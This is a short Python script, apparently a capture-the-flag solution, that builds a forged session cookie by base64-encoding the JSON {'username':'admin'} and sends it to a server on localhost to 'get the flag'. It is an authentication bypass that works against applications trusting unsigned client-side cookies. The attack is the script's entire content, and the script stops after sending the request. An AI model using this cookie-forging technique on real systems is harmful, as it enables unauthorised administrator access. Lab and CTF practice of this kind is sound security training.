#!/usr/bin/env python3
import requests
import base64
import json

url = "http://localhost:8000"
# Get the flag
cookie = {
    "username":"admin"
}

cookie = base64.b64encode(json.dumps(cookie).encode()).decode()

r = requests.get(url, cookies={"user":cookie})